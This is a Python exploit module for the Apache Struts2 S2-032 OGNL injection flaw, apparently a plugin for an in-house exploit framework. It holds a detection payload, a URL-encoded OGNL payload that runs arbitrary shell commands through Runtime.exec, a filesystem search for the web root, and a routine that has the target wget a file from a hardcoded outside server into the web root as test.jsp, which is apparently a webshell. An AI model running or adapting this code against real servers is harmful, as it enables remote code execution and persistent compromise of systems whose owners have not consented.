# coding:utf-8
import sys
# sys.path.append('..')
import re
from exp_template import Exploit, Level, session

"""
构造函数需要传递以下参数
url   测试目标的url
exp需要实现的方法为meta_info和exploit
create by swm  2018/06/26
done:
获取webpath
执行shell命令，无法执行echo命令写文件
can do:
执行wget下载文件(需要提供服务器地址)
"""


class S2032(Exploit):

    def meta_info(self):
        return {
            'name': 'S2-032EXP',
            'author': 'swm',
            'date': '2018/06/26'
        }

    def ifpoc(self):
        poc = '''{}/memoindex.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23context[%23parameters.obj[0]].getWriter().print(%23parameters.content[0]%2b602%2b53718),1?%23xx:%23request.toString&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=10086'''
        url = poc.format(self.url)
        s = session()
        try:
            r = s.get(url, timeout=5)
            resp = r.text.encode("utf-8")
            if resp == '1008660253718':
                return True
            else:
                return False
        except Exception as e:
            self.report('url connect error {}'.format(e), Level.error)
            return False

    def executecmd(self, cmd):
        exp = '''{}/memoindex.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd={}'''
        url = exp.format(self.url, cmd)
        s = session()
        try:
            r = s.get(url, timeout=5)
            res = r.text.encode("utf-8")
            return res
        except Exception as e:
            self.report('connect error {}'.format(e), Level.error)
            return False

    def getwebpath(self):
        cmd = 'find / -name *.jsp'
        re_webpath = re.compile(r'.+webapps\/\w+\/')
        str = self.executecmd(cmd)
        webpath = re_webpath.search(str)
        if webpath:
            return webpath.group()
        else:
            self.report('Canot find webpath', Level.error)
            return False

    def wgetfile(self, serverurl, filepath):
        cmd = ''' wget {} -O {}test.jsp'''.format(serverurl, filepath)
        response = self.executecmd(cmd)
        return response

    def exploit(self):
        if self.url == '' or (not self.url.startswith('http://') and not self.url.startswith('https://')):
            self.report('url error', Level.error)
            return
        poc = self.ifpoc()
        if poc:
            webpath = self.getwebpath()
            serverurl = '''http://172.22.209.33:8014/api/download'''
            res = self.wgetfile(serverurl, webpath)
            self.report('wget file {}'.format(res), Level.info)
            return True
        else:
            return False


if __name__ == '__main__':
    if len(sys.argv) == 2:
        s = S2032(sys.argv[1])
        res = s.exploit()
        print res
